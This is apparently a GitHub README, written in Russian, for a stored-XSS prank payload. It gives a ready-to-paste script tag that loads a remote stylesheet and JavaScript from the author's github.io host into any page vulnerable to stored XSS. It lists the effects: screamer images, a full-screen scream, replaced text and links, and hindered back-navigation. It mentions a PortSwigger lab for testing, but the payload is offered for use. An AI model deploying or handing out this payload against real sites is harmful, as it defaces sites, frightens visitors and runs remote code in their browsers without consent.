# Stored-XSS-scary

Код сработает только при наличии уязвимости хранимый XSS + если сайт не будет блокировать загрузку внешних скриптов и стилей. <br>
Для теста можно запустить лабараторку в https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded.

https://github.com/0-DAyFF13R/Stored-XSS-scary/assets/63510648/918e3044-14b0-45c1-aa3c-c795c30caf6f

------------------------------------------

Полная версия (JS + CSS) [288 символов]:
> <script>var c=document.createElement('link');c.rel='stylesheet';c.href='//0-dayff13r.github.io/Stored-XSS-scary/styles.css';document.head.appendChild(c);var r=document.createElement('script');r.src='//0-dayff13r.github.io/Stored-XSS-scary/script.js';document.body.appendChild(r);</script>

* Страшная музыка
* Постепенно изменяющийся цвет фона на красный
* Прыгающий и мигающий текст
* Частичные трудности при возвращении на предыдущую страницу
* Замена всех изображений на скример
* Замена текста из тегов <p>, <h1>, <a>
* Замена всех тегов <a> на <p>
* Скример на весь экран с криком в течение какого-то времени
